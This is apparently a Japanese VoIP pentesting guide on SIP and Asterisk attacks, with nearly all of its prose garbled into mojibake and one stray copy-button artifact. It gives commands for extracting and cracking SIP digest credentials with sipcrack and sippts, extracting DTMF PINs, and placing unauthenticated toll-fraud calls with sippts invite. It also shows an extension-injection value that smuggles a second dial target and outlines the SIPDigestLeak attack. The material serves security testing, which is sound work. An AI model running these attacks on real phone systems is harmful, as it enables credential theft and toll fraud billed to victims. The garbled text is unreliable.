#### SIPè³‡æ ¼æƒ…å ±ï¼ˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ - ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ï¼‰

**SIP REGISTERé€šä¿¡**ã®**è³‡æ ¼æƒ…å ±ã®é€ä¿¡æ–¹æ³•**ã‚’ç†è§£ã™ã‚‹ãŸã‚ã®[ã“ã®ä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example)ã€‚

* **`sipdump`** & **`sipcrack`**ã€**sipcrack**ã®ä¸€éƒ¨ï¼ˆ`apt-get install sipcrack`ï¼‰ï¼šã“ã‚Œã‚‰ã®ãƒ„ãƒ¼ãƒ«ã¯ã€SIPãƒ—ãƒ­ãƒˆã‚³ãƒ«å†…ã®**ãƒ€ã‚¤ã‚¸ã‚§ã‚¹ãƒˆèªè¨¼**ã‚’**pcap**ã‹ã‚‰**æŠ½å‡º**ã—ã€**ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dumpã¯ã€pcapãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰ãƒ€ã‚¤ã‚¸ã‚§ã‚¹ãƒˆèªè¨¼ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrackã¯ã€SIPPTSã®ãƒ€ãƒ³ãƒ—ã§å–å¾—ã—ãŸãƒ€ã‚¤ã‚¸ã‚§ã‚¹ãƒˆèªè¨¼ã‚’ã‚¯ãƒ©ãƒƒã‚¯ã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** ã¯ [**sippts**](https://github.com/Pepelux/sippts) ã‹ã‚‰ã®ã‚‚ã®ã§ã™**:** SIPPTS tshark ã¯ PCAP ãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰ SIP ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®ãƒ‡ãƒ¼ã‚¿ã‚’æŠ½å‡ºã—ã¾ã™ã€‚
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMFã‚³ãƒ¼ãƒ‰

ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ä¸­ã«ã¯ã€**SIPè³‡æ ¼æƒ…å ±**ã ã‘ã§ãªãã€**ãƒœã‚¤ã‚¹ãƒ¡ãƒ¼ãƒ«**ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹DTMFã‚³ãƒ¼ãƒ‰ã‚‚è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã“ã‚Œã‚‰ã®ã‚³ãƒ¼ãƒ‰ã¯ã€**INFO SIPãƒ¡ãƒƒã‚»ãƒ¼ã‚¸**ã€**ã‚ªãƒ¼ãƒ‡ã‚£ã‚ª**ã€ã¾ãŸã¯**RTPãƒ‘ã‚±ãƒƒãƒˆ**ã®ä¸­ã«é€ä¿¡ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚RTPãƒ‘ã‚±ãƒƒãƒˆå†…ã«ã‚³ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã‚‹å ´åˆã€ä¼šè©±ã®ãã®éƒ¨åˆ†ã‚’åˆ‡ã‚Šå–ã‚Šã€ãƒ„ãƒ¼ãƒ«multimoã‚’ä½¿ç”¨ã—ã¦ãã‚Œã‚‰ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
multimon -a DTMF -t wac pin.wav
```
### ç„¡æ–™é€šè©± / Asterisksæ¥ç¶šã®è¨­å®šãƒŸã‚¹

Asteriskã§ã¯ã€ç‰¹å®šã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰ã®æ¥ç¶šã¾ãŸã¯ä»»æ„ã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰ã®æ¥ç¶šã‚’è¨±å¯ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼š
```
host=10.10.10.10
host=dynamic
```
IPã‚¢ãƒ‰ãƒ¬ã‚¹ãŒæŒ‡å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒ›ã‚¹ãƒˆã¯å®šæœŸçš„ã«REGISTERãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ï¼ˆé€šå¸¸ã€REGISTERãƒ‘ã‚±ãƒƒãƒˆã«ã¯æœ‰åŠ¹æœŸé™ãŒå«ã¾ã‚Œã€é€šå¸¸ã¯30åˆ†ã§ã‚ã‚Šã€åˆ¥ã®ã‚·ãƒŠãƒªã‚ªã§ã¯é›»è©±ãŒ30åˆ†ã”ã¨ã«REGISTERã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚ãŸã ã—ã€VoIPã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ã®é€šè©±ã‚’å—ã‘å…¥ã‚Œã‚‹ãŸã‚ã«æ¥ç¶šã‚’è¨±å¯ã™ã‚‹ã‚ªãƒ¼ãƒ—ãƒ³ãƒãƒ¼ãƒˆãŒå¿…è¦ã§ã™ã€‚

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å®šç¾©ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«å®šç¾©ã§ãã¾ã™ï¼š

- **`type=user`**ï¼šãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ã®ã¿é€šè©±ã‚’å—ã‘å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
- **`type=friend`**ï¼šãƒ”ã‚¢ã¨ã—ã¦é€šè©±ã‚’è¡Œã„ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦å—ã‘å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆæ‹¡å¼µæ©Ÿèƒ½ã¨å…±ã«ä½¿ç”¨ã•ã‚Œã¾ã™ï¼‰ã€‚
- **`type=peer`**ï¼šãƒ”ã‚¢ã¨ã—ã¦é€šè©±ã‚’é€å—ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆSIPãƒˆãƒ©ãƒ³ã‚¯ï¼‰ã€‚

ã¾ãŸã€æ¬¡ã®ã‚ˆã†ã«å®‰å…¨ã§ãªã„å¤‰æ•°ã‚’ä½¿ç”¨ã—ã¦ä¿¡é ¼ã‚’ç¢ºç«‹ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼š

- **`insecure=port`**ï¼šIPã«ã‚ˆã£ã¦æ¤œè¨¼ã•ã‚ŒãŸãƒ”ã‚¢æ¥ç¶šã‚’è¨±å¯ã—ã¾ã™ã€‚
- **`insecure=invite`**ï¼šINVITEãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®èªè¨¼ã‚’å¿…è¦ã¨ã—ã¾ã›ã‚“ã€‚
- **`insecure=port,invite`**ï¼šä¸¡æ–¹

{% hint style="warning" %}
**`type=friend`**ãŒä½¿ç”¨ã•ã‚Œã‚‹å ´åˆã€**ãƒ›ã‚¹ãƒˆ**å¤‰æ•°ã®**å€¤**ã¯ä½¿ç”¨ã•ã‚Œã¾ã›ã‚“ã®ã§ã€ç®¡ç†è€…ãŒãã®å€¤ã‚’ä½¿ç”¨ã—ã¦SIPãƒˆãƒ©ãƒ³ã‚¯ã‚’èª¤æ§‹æˆã—ãŸå ´åˆã€**èª°ã§ã‚‚ãã‚Œã«æ¥ç¶šã§ãã‚‹**å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ãŸã¨ãˆã°ã€æ¬¡ã®æ§‹æˆã¯è„†å¼±ã§ã™ï¼š\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### ç„¡æ–™é€šè©± / Asteriskã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã®èª¤æ§‹æˆ

Asteriskã§ã¯ã€**ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ã¯ãƒ€ã‚¤ãƒ¤ãƒ«ãƒ—ãƒ©ãƒ³å†…ã®é–¢é€£ã™ã‚‹æ‹¡å¼µæ©Ÿèƒ½ã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã€ãŠã‚ˆã³ãƒ«ãƒ¼ãƒ«ã‚’**ã‚°ãƒ«ãƒ¼ãƒ—åŒ–ã™ã‚‹åå‰ä»˜ãã‚³ãƒ³ãƒ†ãƒŠã¾ãŸã¯ã‚»ã‚¯ã‚·ãƒ§ãƒ³**ã§ã™ã€‚ãƒ€ã‚¤ãƒ¤ãƒ«ãƒ—ãƒ©ãƒ³ã¯Asteriskã‚·ã‚¹ãƒ†ãƒ ã®ä¸­æ ¸ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã‚ã‚Šã€**ç€ä¿¡ãŠã‚ˆã³ç™ºä¿¡é€šè©±ã®å‡¦ç†ã¨ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°æ–¹æ³•**ã‚’å®šç¾©ã—ã¾ã™ã€‚ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã¯ãƒ€ã‚¤ãƒ¤ãƒ«ãƒ—ãƒ©ãƒ³ã‚’æ•´ç†ã—ã€ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã‚’ç®¡ç†ã—ã€ã‚·ã‚¹ãƒ†ãƒ ã®ç•°ãªã‚‹éƒ¨åˆ†ã‚’åˆ†é›¢ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

å„ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã¯é€šå¸¸ã€**`extensions.conf`**ãƒ•ã‚¡ã‚¤ãƒ«ã«å®šç¾©ã•ã‚Œã¾ã™ã€‚ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã¯è§’ã‹ã£ã“ã§å›²ã¾ã‚Œã€ãã®ä¸­ã«ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆåãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ä¾‹ï¼š
```bash
csharpCopy code[my_context]
```
ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆå†…ã§ã¯ã€æ‹¡å¼µæ©Ÿèƒ½ï¼ˆãƒ€ã‚¤ãƒ¤ãƒ«ç•ªå·ã®ãƒ‘ã‚¿ãƒ¼ãƒ³ï¼‰ã‚’å®šç¾©ã—ã€ãã‚Œã‚‰ã‚’ä¸€é€£ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«é–¢é€£ä»˜ã‘ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€é€šè©±ã®å‡¦ç†æ–¹æ³•ã‚’æ±ºå®šã—ã¾ã™ã€‚ä¾‹ãˆã°ï¼š
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
ã“ã®ä¾‹ã§ã¯ã€æ‹¡å¼µå­ãŒã€Œ100ã€ã®ã€Œmy\_contextã€ã¨ã„ã†ã‚·ãƒ³ãƒ—ãƒ«ãªã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆãŒç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚èª°ã‹ãŒ100ã‚’ãƒ€ã‚¤ãƒ¤ãƒ«ã™ã‚‹ã¨ã€é€šè©±ãŒå—ã‘ã‚‰ã‚Œã€ã‚¦ã‚§ãƒ«ã‚«ãƒ ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒå†ç”Ÿã•ã‚Œã€ãã®å¾Œé€šè©±ãŒçµ‚äº†ã—ã¾ã™ã€‚

ã“ã‚Œã¯**åˆ¥ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ã§ã€**ä»–ã®ç•ªå·ã«ç™ºä¿¡ã§ãã‚‹**ã‚ˆã†ã«ã—ã¾ã™ï¼š
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
ç®¡ç†è€…ãŒ**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ã‚’æ¬¡ã®ã‚ˆã†ã«å®šç¾©ã—ãŸå ´åˆ:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
èª°ã§ã‚‚**ã‚µãƒ¼ãƒãƒ¼ã‚’ä½¿ç”¨ã—ã¦ä»–ã®ç•ªå·ã«é›»è©±ã‚’ã‹ã‘ã‚‹**ã“ã¨ãŒã§ãã¾ã™ï¼ˆã‚µãƒ¼ãƒãƒ¼ã®ç®¡ç†è€…ãŒé€šè©±æ–™ã‚’æ”¯æ‰•ã„ã¾ã™ï¼‰ã€‚
{% endhint %}

{% hint style="danger" %}
ã•ã‚‰ã«ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯**`sip.conf`**ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯**`allowguest=true`**ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ãã®ãŸã‚**èªè¨¼ãªã—**ã®**ã©ã‚“ãª**æ”»æ’ƒè€…ã§ã‚‚ä»–ã®ç•ªå·ã«é›»è©±ã‚’ã‹ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

*   **`SIPPTS invite`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS inviteã¯ã€**èªè¨¼ãªã—ã§é€šè©±ã‚’è¡Œã†ã“ã¨ã‚’è¨±å¯ã™ã‚‹PBXã‚µãƒ¼ãƒãƒ¼**ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ã€‚ SIPã‚µãƒ¼ãƒãƒ¼ãŒèª¤ã£ãŸæ§‹æˆã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€å¤–éƒ¨ç•ªå·ã«é›»è©±ã‚’ã‹ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€é€šè©±ã‚’ç¬¬äºŒã®å¤–éƒ¨ç•ªå·ã«è»¢é€ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

ãŸã¨ãˆã°ã€Asteriskã‚µãƒ¼ãƒãƒ¼ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆæ§‹æˆãŒæ‚ªã„å ´åˆã€AUTHORIZATIONãªã—ã§INVITEãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å—ã‘å…¥ã‚Œã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®å ´åˆã€æ”»æ’ƒè€…ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼å/ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’çŸ¥ã‚‰ãªãã¦ã‚‚é›»è©±ã‚’ã‹ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### ç„¡æ–™é€šè©± / è¨­å®šãƒŸã‚¹ã® IVRS

IVRS ã¯ **Interactive Voice Response System** ã®ç•¥ã§ã€éŸ³å£°ã‚„ã‚¿ãƒƒãƒãƒˆãƒ¼ãƒ³å…¥åŠ›ã‚’é€šã˜ã¦ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿åŒ–ã•ã‚ŒãŸã‚·ã‚¹ãƒ†ãƒ ã¨ã‚„ã‚Šå–ã‚Šã™ã‚‹ãŸã‚ã®é›»è©±æŠ€è¡“ã§ã™ã€‚ IVRS ã¯æƒ…å ±æä¾›ã€é€šè©±ã®ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã®åé›†ãªã©ã€ã•ã¾ã–ã¾ãªæ©Ÿèƒ½ã‚’æä¾›ã™ã‚‹ **è‡ªå‹•é€šè©±å‡¦ç†** ã‚·ã‚¹ãƒ†ãƒ ã‚’æ§‹ç¯‰ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

VoIP ã‚·ã‚¹ãƒ†ãƒ ã® IVRS ã«ã¯é€šå¸¸ã€ä»¥ä¸‹ãŒå«ã¾ã‚Œã¾ã™ï¼š

1. **éŸ³å£°ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆ**ï¼šãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ IVR ãƒ¡ãƒ‹ãƒ¥ãƒ¼ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¨æ‰‹é †ã«æ¡ˆå†…ã™ã‚‹äº‹å‰éŒ²éŸ³ã•ã‚ŒãŸéŸ³å£°ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã€‚
2. **DTMF** (Dual-Tone Multi-Frequency) ã‚·ã‚°ãƒŠãƒªãƒ³ã‚°ï¼šé›»è©±ã§ã‚­ãƒ¼ã‚’æŠ¼ã™ã“ã¨ã§ç”Ÿæˆã•ã‚Œã‚‹ã‚¿ãƒƒãƒãƒˆãƒ¼ãƒ³å…¥åŠ›ã§ã€IVR ãƒ¡ãƒ‹ãƒ¥ãƒ¼ã‚’ãƒŠãƒ“ã‚²ãƒ¼ãƒˆã—ã€å…¥åŠ›ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
3. **é€šè©±ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°**ï¼šãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã«åŸºã¥ã„ã¦ã€ç‰¹å®šã®éƒ¨ç½²ã€ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã€ã¾ãŸã¯æ‹¡å¼µæ©Ÿèƒ½ãªã©ã€é©åˆ‡ãªå®›å…ˆã«é€šè©±ã‚’èª˜å°ã™ã‚‹ã“ã¨ã€‚
4. **ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã®åé›†**ï¼šã‚¢ã‚«ã‚¦ãƒ³ãƒˆç•ªå·ã€ã‚±ãƒ¼ã‚¹ IDã€ã¾ãŸã¯ãã®ä»–ã®é–¢é€£ãƒ‡ãƒ¼ã‚¿ãªã©ã€ç™ºä¿¡è€…ã‹ã‚‰æƒ…å ±ã‚’åé›†ã™ã‚‹ã“ã¨ã€‚
5. **å¤–éƒ¨ã‚·ã‚¹ãƒ†ãƒ ã¨ã®çµ±åˆ**ï¼šIVR ã‚·ã‚¹ãƒ†ãƒ ã‚’ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚„ä»–ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚·ã‚¹ãƒ†ãƒ ã«æ¥ç¶šã—ã¦æƒ…å ±ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚„æ›´æ–°ã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®å®Ÿè¡Œã€ã‚¤ãƒ™ãƒ³ãƒˆã®ãƒˆãƒªã‚¬ãƒ¼ã‚’è¡Œã†ã“ã¨ã€‚

Asterisk VoIP ã‚·ã‚¹ãƒ†ãƒ ã§ã¯ã€ãƒ€ã‚¤ãƒ¤ãƒ«ãƒ—ãƒ©ãƒ³ (**`extensions.conf`** ãƒ•ã‚¡ã‚¤ãƒ«) ã‚„ `Background()`ã€`Playback()`ã€`Read()` ãªã©ã®ã•ã¾ã–ã¾ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ IVR ã‚’ä½œæˆã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€éŸ³å£°ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã®å†ç”Ÿã€ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã®åé›†ã€é€šè©±ãƒ•ãƒ­ãƒ¼ã®åˆ¶å¾¡ã‚’æ”¯æ´ã—ã¾ã™ã€‚

#### è„†å¼±ãªæ§‹æˆã®ä¾‹
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
å‰è¿°ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å¯¾ã—ã¦ã€éƒ¨ç½²ã«é›»è©±ã‚’ã‹ã‘ã‚‹å ´åˆã¯**1ã‚’æŠ¼ã—**ã€åˆ¥ã®éƒ¨ç½²ã«é›»è©±ã‚’ã‹ã‘ã‚‹å ´åˆã¯**2ã‚’æŠ¼ã—**ã€ã‚‚ã—ãã¯çŸ¥ã£ã¦ã„ã‚‹å ´åˆã¯**å®Œå…¨ãªå†…ç·šç•ªå·**ã‚’å…¥åŠ›ã™ã‚‹ã‚ˆã†æ±‚ã‚ã‚‹ä¾‹ã§ã™ã€‚\
è„†å¼±æ€§ã¯ã€æŒ‡å®šã•ã‚ŒãŸ**å†…ç·šç•ªå·ã®é•·ã•ãŒãƒã‚§ãƒƒã‚¯ã•ã‚Œã¦ã„ãªã„ãŸã‚ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ5ç§’ã®ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆå†…ã«å®Œå…¨ãªç•ªå·ã‚’å…¥åŠ›ã™ã‚‹ã¨ã€ãã®ç•ªå·ã«é›»è©±ãŒã‹ã‹ã£ã¦ã—ã¾ã†**ã¨ã„ã†ç‚¹ã§ã™ã€‚

### å†…ç·šç•ªå·ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

æ¬¡ã®ã‚ˆã†ãªå†…ç·šç•ªå·ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
æ¬¡ã«ã€**`${EXTEN}`** ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹**å†…ç·š**ã§ã€**ext 101 ãŒå…¥åŠ›ã•ã‚ŒãŸ**å ´åˆã€æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```scss
exten => 101,1,Dial(SIP/101)
```
ã—ã‹ã—ã€ã‚‚ã—**`${EXTEN}`**ãŒ**æ•°å­—ä»¥å¤–**ã‚’å°å…¥ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã™ã‚‹å ´åˆï¼ˆå¤ã„Asteriskãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®ã‚ˆã†ã«ï¼‰ã€æ”»æ’ƒè€…ã¯**`101&SIP123123123`**ã‚’å°å…¥ã—ã¦é›»è©±ç•ªå·123123123ã«é›»è©±ã‚’ã‹ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã—ã¦ã€ãã®çµæœã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
ã—ãŸãŒã£ã¦ã€**`101`** ã¨ **`123123123`** ã®æ‹¡å¼µå­ã¸ã®é€šè©±ãŒé€ä¿¡ã•ã‚Œã€é€šè©±ã‚’å—ã‘ãŸæœ€åˆã®ã‚‚ã®ã ã‘ãŒç¢ºç«‹ã•ã‚Œã¾ã™...ã—ã‹ã—ã€**ä¸€è‡´ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹æ‹¡å¼µå­** ã‚’ä½¿ç”¨ã™ã‚‹æ”»æ’ƒè€…ãŒå­˜åœ¨ã—ãªã„ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆã€**å¸Œæœ›ã®ç•ªå·ã«ã®ã¿é€šè©±ã‚’æ³¨å…¥** ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## SIPDigestLeakè„†å¼±æ€§

SIP Digest Leak ã¯ã€ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ãŠã‚ˆã³ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ IP é›»è©±æ©Ÿã€ãŠã‚ˆã³é›»è©±ã‚¢ãƒ€ãƒ—ã‚¿ãƒ¼ï¼ˆVoIP ã‹ã‚‰ã‚¢ãƒŠãƒ­ã‚°ã¸ã®å¤‰æ›å™¨ï¼‰ã‚’å«ã‚€å¤šæ•°ã® SIP é›»è©±æ©Ÿã«å½±éŸ¿ã‚’ä¸ãˆã‚‹è„†å¼±æ€§ã§ã™ã€‚ã“ã®è„†å¼±æ€§ã«ã‚ˆã‚Šã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‹ã‚‰è¨ˆç®—ã•ã‚Œã‚‹ Digest èªè¨¼å¿œç­”ãŒ**æ¼æ´©**ã—ã¾ã™ã€‚ãã®å¾Œã€**ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰æ”»æ’ƒ**ãŒå¯èƒ½ã¨ãªã‚Šã€ãƒãƒ£ãƒ¬ãƒ³ã‚¸ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«åŸºã¥ã„ã¦ã»ã¨ã‚“ã©ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å›å¾©ã§ãã¾ã™ã€‚

**[ã“ã“ã‹ã‚‰ã®è„†å¼±æ€§ã‚·ãƒŠãƒªã‚ª**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. IP é›»è©±æ©Ÿï¼ˆè¢«å®³è€…ï¼‰ã¯ä»»æ„ã®ãƒãƒ¼ãƒˆï¼ˆä¾‹: 5060ï¼‰ã§ãƒªã‚¹ãƒ‹ãƒ³ã‚°ã—ã€é›»è©±ã‚’å—ã‘å…¥ã‚Œã¾ã™
2. æ”»æ’ƒè€…ãŒ IP é›»è©±æ©Ÿã« INVITE ã‚’é€ä¿¡ã—ã¾ã™
3. è¢«å®³è€…é›»è©±æ©ŸãŒé³´ã‚Šå§‹ã‚ã€èª°ã‹ãŒé›»è©±ã«å‡ºã¦åˆ‡ã‚Šã¾ã™ï¼ˆä»–ã®ç«¯æœ«ã§é›»è©±ã«å‡ºãªã„ãŸã‚ï¼‰
4. é›»è©±ãŒåˆ‡ã‚Œã‚‹ã¨ã€**è¢«å®³è€…é›»è©±æ©Ÿã¯æ”»æ’ƒè€…ã« BYE ã‚’é€ä¿¡**ã—ã¾ã™
5. **æ”»æ’ƒè€…ã¯ 407 å¿œç­”ã‚’ç™ºè¡Œ**ã—ã€**èªè¨¼ã‚’è¦æ±‚**ã—ã€èªè¨¼ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã‚’ç™ºè¡Œã—ã¾ã™
6. **è¢«å®³è€…é›»è©±æ©Ÿã¯èªè¨¼ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã«å¯¾ã™ã‚‹å¿œç­”**ã‚’ 2 å›ç›®ã® BYE ã§æä¾›ã—ã¾ã™
7. **æ”»æ’ƒè€…ã¯ãã®å¾Œã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒã‚·ãƒ³ï¼ˆã¾ãŸã¯åˆ†æ•£ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãªã©ï¼‰ã§ãƒãƒ£ãƒ¬ãƒ³ã‚¸ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«å¯¾ã™ã‚‹ç·å½“ãŸã‚Šæ”»æ’ƒ**ã‚’å®Ÿè¡Œã—ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¨æ¸¬ã§ãã¾ã™

